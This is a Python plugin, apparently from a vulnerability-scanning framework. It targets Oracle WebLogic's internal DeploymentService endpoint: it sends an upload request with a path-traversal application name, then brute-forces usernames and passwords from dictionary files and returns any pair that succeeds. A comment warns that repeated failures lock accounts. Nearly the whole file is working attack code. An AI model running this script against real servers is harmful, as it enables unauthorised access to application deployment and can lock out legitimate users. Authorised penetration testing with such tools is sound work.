#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from aiohttp import FormData
from lib.core.env import *
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript
from copy import deepcopy

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEBLOGIC

    def load_dict(self):
        username_txt_path = self.parameter.get("U", None)
        if username_txt_path:
            self.username_list = self.read_file(username_txt_path)
        else:
            self.username_list = self.get_default_dict("weblogic_usernames.txt")

        password_txt_path = self.parameter.get("P", None)
        if password_txt_path:
            self.password_list = self.read_file(password_txt_path)
        else:
            self.password_list = self.get_default_dict("weblogic_passwords.txt")


    async def prove(self):
        if self.base_url:
            url = self.base_url + 'bea_wls_deployment_internal/DeploymentService'
            async with ClientSession() as session:
                headers = {
                    "Servername": "test123",
                    "Cache-Control": "no-cache",
                    "Wl_upload_delta": "true",
                    "Server_version": "10.3.6.0",
                    "Archive": "true",
                    "Wl_upload_application_name": "../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war",
                    "Wl_request_type": "app_upload",
                    "Username": "test",
                    "Password": "test123",
                }
                data = FormData()
                data.add_field('1.txt', "111 ", filename='1.txt', content_type='false')
                async with session.post(url=url, data=data, headers=headers, allow_redirects=False) as res:
                    if res and res.status == 401:
                        text = await res.text()
                        if text and 'Deployment' in text:
                            async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list): #    登陆失败错误过多会锁账户，不建议尝试爆破过多,5次以下差不多
                                temp_headers = deepcopy(headers)
                                temp_headers["Username"] = username
                                temp_headers["Password"] = password
                                try:
                                    async with session.post(url=url, data=data, headers=temp_headers,  allow_redirects=False) as res:
                                        if res and res.status in [200, 201, 202, 403]:
                                            yield username + "/" + password
                                except:
                                    pass

